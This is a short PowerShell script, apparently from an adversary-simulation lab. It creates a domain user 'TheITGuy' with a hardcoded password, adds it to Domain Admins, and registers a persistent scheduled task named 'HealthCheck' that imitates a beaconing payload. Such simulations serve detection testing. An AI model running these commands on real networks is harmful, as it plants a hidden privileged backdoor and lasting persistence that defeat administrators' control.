<#
.SYNOPSIS
    Simulates adversary activity by creating a backdoor account and a malicious scheduled task.

.DESCRIPTION
    Creates a hidden high-privilege user account ('TheITGuy') and adds it to the Domain Admins group.
    Registers a persistent scheduled task ('HealthCheck') that runs as SYSTEM (S-1-5-18)
    to simulate a C2 beaconing payload.
#>

# Get current domain info
$Domain = (Get-ADDomain).DNSRoot

# Create a malicious user
$MalUser = "TheITGuy"
$MalPass = "P@ssw0rd1234!"
$User = New-ADUser -Name $MalUser -GivenName "The" -Surname "ITGuy" -SamAccountName $MalUser -UserPrincipalName "$MalUser@$Domain" -AccountPassword (ConvertTo-SecureString $MalPass -AsPlainText -Force) -PassThru | Enable-ADAccount
Write-Host " [+] Created malicious user: $MalUser" -ForegroundColor Green

# Add the user to Domain Admins group
Add-ADGroupMember -Identity "Domain Admins" -Members $MalUser | Out-Null
Write-Host " [!] Added $MalUser to Domain Admins group" -ForegroundColor Red

# Create backdoor Scheduled Task 
$XMLPath = "$PSScriptRoot\Data\HealthCheck.xml"

Register-ScheduledTask -TaskName "HealthCheck" -Xml (Get-Content $XMLPath | Out-String) | Out-Null
Write-Host " [!] Created backdoor Scheduled Task: HealthCheck" -ForegroundColor Red
Write-Host ""